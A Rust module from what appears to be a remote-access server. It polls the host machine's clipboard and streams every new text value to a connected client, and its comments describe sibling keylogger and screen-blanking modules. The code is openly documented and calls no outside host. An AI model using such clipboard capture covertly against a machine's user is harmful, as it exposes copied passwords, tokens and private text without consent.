//! The "share clipboard" feature: while toggled on by a connected client,
//! whichever side's clipboard changes gets mirrored onto the other's.
//! This direction (host -> client) is this module's job: it polls the
//! host's OS clipboard for changes while enabled, forwarding each new
//! value out over the channel given to `enable`, and applies incoming
//! updates from the client via `set_local`. `main.rs` holds one of these
//! per connection as a local variable in `handle_client`, same
//! enable-on-request/disable-on-every-exit-path lifecycle as
//! `blank_screen.rs`'s overlay and `keylogger.rs`'s hook.
//!
//! Unlike those two, clipboard access (via the cross-platform `arboard`
//! crate) isn't Windows-only, so this module doesn't need the
//! `#[cfg(windows)]` split they use.

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::mpsc;
use std::sync::{Arc, Mutex};
use std::time::Duration;

/// Owns the background thread that polls this machine's OS clipboard for
/// changes while sync is enabled. Also the single point through which a
/// remote update gets applied locally (`set_local`), so the poll thread
/// can tell "we changed it because the other side told us to" apart from
/// "someone at this machine actually copied something new" - without that
/// distinction, every remote update would immediately get detected as a
/// local change and echoed straight back, forever.
pub struct ClipboardSync {
    running: Arc<AtomicBool>,
    /// The last text either end is aware of - shared with the poll thread
    /// so `set_local` can mark a remote update as "already known" before
    /// the poll thread's next tick sees it.
    last_known: Arc<Mutex<Option<String>>>,
    thread: Option<std::thread::JoinHandle<()>>,
}

impl ClipboardSync {
    pub fn new() -> Self {
        Self { running: Arc::new(AtomicBool::new(false)), last_known: Arc::new(Mutex::new(None)), thread: None }
    }

    pub fn is_enabled(&self) -> bool {
        self.thread.is_some()
    }

    /// Turn sync on: starts polling the local clipboard, forwarding each
    /// newly-detected value over `tx`. A no-op if it's already on (same
    /// convention as `KeyLogger::enable`/`BlankScreenOverlay::enable`).
    pub fn enable(&mut self, tx: mpsc::Sender<String>) -> Result<(), String> {
        if self.thread.is_some() {
            return Ok(());
        }

        // Probe access up front so a broken clipboard (no display server,
        // locked session, etc.) fails the toggle immediately with a clear
        // reason instead of the poll thread just silently never sending
        // anything.
        arboard::Clipboard::new().map_err(|e| format!("clipboard unavailable: {e}"))?;

        self.running.store(true, Ordering::SeqCst);
        let running = self.running.clone();
        let last_known = self.last_known.clone();
        let handle = std::thread::spawn(move || {
            // Already probed above; a fresh instance here shouldn't fail,
            // but if it somehow does, there's nothing to poll - just exit
            // rather than spin.
            let mut clipboard = match arboard::Clipboard::new() {
                Ok(c) => c,
                Err(_) => return,
            };
            while running.load(Ordering::Relaxed) {
                // get_text() errors on a clipboard that's empty or holds
                // a non-text format (an image, say) - not a real failure,
                // just nothing to sync this tick.
                if let Ok(text) = clipboard.get_text() {
                    let mut last = last_known.lock().unwrap();
                    if last.as_deref() != Some(text.as_str()) {
                        *last = Some(text.clone());
                        drop(last); // release before the (possibly blocking) send
                        if tx.send(text).is_err() {
                            break; // receiver gone - session ending
                        }
                    }
                }
                std::thread::sleep(Duration::from_millis(400));
            }
        });
        self.thread = Some(handle);
        Ok(())
    }

    /// Turn sync off. A no-op if it's already off.
    pub fn disable(&mut self) {
        self.running.store(false, Ordering::SeqCst);
        if let Some(t) = self.thread.take() {
            let _ = t.join();
        }
        *self.last_known.lock().unwrap() = None;
    }

    /// Apply a clipboard update received from the other side to this
    /// machine's OS clipboard, remembering it as `last_known` first so
    /// the poll thread doesn't immediately re-detect and echo it back.
    /// Best-effort: a failure here (same causes as `enable`'s probe) just
    /// means this one update didn't take, not a reason to tear anything
    /// down.
    pub fn set_local(&self, text: &str) {
        *self.last_known.lock().unwrap() = Some(text.to_string());
        if let Ok(mut clipboard) = arboard::Clipboard::new() {
            let _ = clipboard.set_text(text.to_string());
        }
    }
}

impl Drop for ClipboardSync {
    fn drop(&mut self) {
        // A dropped session (disconnect, error) must never leave a
        // clipboard-polling thread running past it.
        self.disable();
    }
}
